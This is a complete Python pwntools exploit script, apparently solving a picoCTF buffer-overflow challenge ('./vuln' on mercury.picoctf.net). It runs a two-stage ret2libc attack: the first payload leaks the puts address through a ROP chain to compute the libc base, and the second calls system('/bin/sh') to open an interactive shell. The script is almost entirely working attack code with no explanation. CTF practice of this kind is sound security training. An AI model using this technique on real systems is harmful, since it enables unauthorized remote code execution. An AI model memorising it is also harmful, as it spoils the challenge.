from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["konsole", "--hold", "-e"]
host, port = 'mercury.picoctf.net', 37289

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    pop_rdi = 0x400913
    ret = 0x40052e

    # first payload to leak puts
    offset = 136
    payload = flat({
        offset: [
            pop_rdi,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
        ]
    })

    io.sendlineafter(b'!', payload)
    io.recvlines(2)
    puts = unpack(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = puts - libc.sym['puts']
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    info('GOT-puts: %#x', puts)
    info('libc base: %#x', libc.address)
    info('binsh: %#x', binsh)
    info('system: %#x', system)

    # second payload to gain shell
    payload = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })

    io.sendlineafter(b'!', payload)
    io.interactive()
    # print(result)
if __name__ == '__main__':
    exploit()